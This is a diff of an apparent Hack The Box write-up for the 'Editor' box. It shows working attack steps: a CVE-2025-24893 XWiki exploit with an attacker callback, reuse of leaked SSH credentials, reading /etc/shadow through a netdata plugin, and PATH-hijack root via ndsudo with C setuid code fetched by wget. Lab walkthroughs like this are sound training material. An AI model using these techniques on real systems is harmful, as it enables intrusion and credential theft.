@@ -6,7 +6,7 @@ Editor is an “easy” level Linux box that will have us exploiting an XWiki in
 
 A quick nmap shows us three open ports: 22, 80, 8080.
 
-```php
+```
 ┌──(kali㉿kali)-[~]
 └─$ nmap -A editor.htb         
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 10:14 EST
@@ -84,7 +84,7 @@ I don’t know any Groovy code, but thankfully some mysterious strangers release
 
 I use [this tool](https://github.com/nopgadget/CVE-2025-24893) from nopgadget. 
 
-```bash
+```
 ┌──(kali㉿kali)-[~/workspace/editor]
 └─$ python3 exploit.py -i 10.10.16.42 -p 6666 wiki.editor.htb
 ================================================================================
@@ -139,7 +139,7 @@ xwiki
 
 We check /etc/passwd and /home for users, revealing a single user named “oliver.” There’s no sudo access, so that’s out. We then take a look at the running services on the machine.
 
-```jsx
+```
 $ netstat -tulnp
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
@@ -189,7 +189,7 @@ $ cat /etc/xwiki/hibernate.cfg.xml
 
 There is nothing interesting in the MySQL database, but the credentials work for the “oliver” user. We can login via SSH with `oliver / theEd1t0rTeam99` .
 
-```jsx
+```
 ┌──(kali㉿kali)-[~/workspace/editor]
 └─$ ssh oliver@editor.htb    
 The authenticity of host 'editor.htb (10.129.247.49)' can't be established.
@@ -235,7 +235,7 @@ The agent is flagged for needing a “critical” severity security patch. It ju
 
 This binary is intended allow netdata to run some pre-defined binaries as root without relying on sudo. However, it relies on the user-controlled PATH to find the binary. We can use path hijacking to make it execute our code instead.
 
-```jsx
+```
 oliver@editor:/tmp$ export PATH=/tmp:$PATH
 oliver@editor:/tmp$ echo $PATH
 /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
@@ -258,7 +258,7 @@ And it doesn’t work. I actually had a bit of an issue here - ndsudo *should* r
 
 Let’s back things up a bit and re-enumerate. I upload and run LinPEAS. Most of the script output is not too helpful, but this jumped out:
 
-```jsx
+```
 Files with capabilities (limited to 50):
 /opt/netdata/usr/libexec/netdata/plugins.d/slabinfo.plugin cap_dac_read_search=ep
 /opt/netdata/usr/libexec/netdata/plugins.d/debugfs.plugin cap_dac_read_search=ep
@@ -269,7 +269,7 @@ Files with capabilities (limited to 50):
 
 cap_dac_read_search means that the binary is able to read any file on the system. go.d.plugin seems promising, so we run it without any flags. We get quite a lot of output, but we see something of interest in it.
 
-```bash
+```
 ERR error on parsing response : can't parse '[<!doctype html> <html lang="en"> <head> <meta charset="UTF-8" /> <link rel="icon" type="image/svg+xml" href="/vite.svg" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <title>Editor - SimplistCode Pro</title> <meta name="description" content="A Futuristic Code Editor for Everyone. SimplistCode Pro — Minimal. Powerful. Redefined for the modern developer." /> <script type="module" crossorigin src="/assets/index-VRKEJlit.js"></script> <link rel="stylesheet" crossorigin href="/assets/index-DzxC4GL5.css"> </head> <body> <div id="root"></div> </body> </html>]' collector=nginx job=local
 ERR check failed collector=nginx job=local
 CONFIG go.d:collector:nginx:local status failed
@@ -279,7 +279,7 @@ It’s leaking a lot of information in the error messages. This gives me an idea
 
 We can also set custom jobs, like this:
 
-```jsx
+```
 jobs:
   - name: some_name1
   - name: some_name2
@@ -302,13 +302,14 @@ On our first try, we give nginx a shot and see if it’ll try to read something 
 
 We put this into /tmp/nginx.conf:
 
-```php
+```
 cat > nginx.conf << EOF
 jobs:
    -name: file_read
     path: file:///root/root.txt
    -name: file_read2
     path: file:///etc/shadow
+EOF
 ```
 
 Then we run this command:
@@ -319,7 +320,7 @@ Then we run this command:
 
 -d enables debug mode, -m tells go.d.plugin to only run the nginx collector, and -c specifies our config directory. The result?
 
-```bash
+```
 INF agent/setup.go:79 building discovery config component=agent
 DBG agent/setup.go:126 looking for 'nginx.conf' in [/tmp/] component=agent
 DBG agent/setup.go:142 found '/tmp/nginx.conf component=agent
@@ -330,7 +331,7 @@ ERR module/job.go:238 check failed collector=nginx job=file_read
 
 …
 
-```bash
+```
 ERR nginx/nginx.go:77 error on request : Get "file:///root/root.txt": unsupported protocol scheme "file" collector=nginx job=file_read
 ERR module/job.go:238 check failed collector=nginx job=file_read
 ```
@@ -339,13 +340,14 @@ Partial success! We are able to create custom jobs for the modules, but the ngin
 
 We write this to /tmp/web_log.conf:
 
-```php
-oliver@editor:/tmp$ cat web_log.conf 
+```
+oliver@editor:/tmp$ cat > web_log.conf << EOF
 jobs:
    - name: file_read
      path: /root/root.txt
    - name: file_read2
      path: /etc/shadow
+EOF
 ```
 
 Then we run:
@@ -368,7 +370,7 @@ First, we tried a bash script that copied /bin/bash to /tmp as root and then set
 
 When `ndsudo` calls a binary, it does this:
 
-```jsx
+```c
         char *clean_env[] = {NULL};
         execve(filename, params, clean_env);
         perror("execve"); // execve only returns on error
@@ -383,7 +385,7 @@ Similarly, if we run a binary that uses system() calls, it *actually* calls `exe
 
 There are three ways to bypass this. First, we can use setuid and setgid. When setuid is called with 0 (root), it will set both the effective and real uids to 0. The shell will be happy that these are equal to each other, and it will run as root.
 
-```jsx
+```c
 #include <unistd.h>
 
 int main() {
@@ -395,8 +397,7 @@ int main() {
 
 Or, we can run bash in privileged mode. This will tell bash to ignore the difference between the euid and ruid.
 
-```jsx
-  GNU nano 8.6                                                                                               test_bin.c                                                                                                        
+```c                                                                                                     
 #include <unistd.h>
 
 int main() {
@@ -407,7 +408,7 @@ int main() {
 
 Or we can bypass calling a shell altogether.
 
-```jsx
+```c
 #include <unistd.h>
 #include <sys/stat.h>
 #include <sys/wait.h>
@@ -429,7 +430,7 @@ int main() {
 
 We will use the third, slightly more manual option. We compile it on our local machine and spin up a http server.
 
-```jsx
+```
 ┌──(kali㉿kali)-[~/workspace]
 └─$ gcc binbashexploit.c -o rootbashmaker
 
@@ -440,7 +441,7 @@ Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
 
 Then we pull it down and fix our PATH.
 
-```jsx
+```
 oliver@editor:/tmp$ wget http://10.10.16.42:1234/rootbashmaker -O ./nvme
 --2025-11-27 02:35:46--  http://10.10.16.42:1234/rootbashmaker
 Connecting to 10.10.16.42:1234... connected.
@@ -460,7 +461,7 @@ oliver@editor:/tmp$ /opt/netdata/netdata-plugins/plugins.d/ndsudo nvme-list
 
 Our rootbash is in /tmp.
 
-```jsx
+```
 oliver@editor:/tmp$ ls -al
 total 1412
 drwxrwxrwt  8 root    root       4096 Nov 27 02:35 .
@@ -479,7 +480,7 @@ drwx------  2 root    root       4096 Nov 27 02:17 vmware-root_610-2731152165
 
 We can use the -p flag to gain root.
 
-```jsx
+```
 oliver@editor:/tmp$ ./bash -p
 bash-5.1# whoami
 root
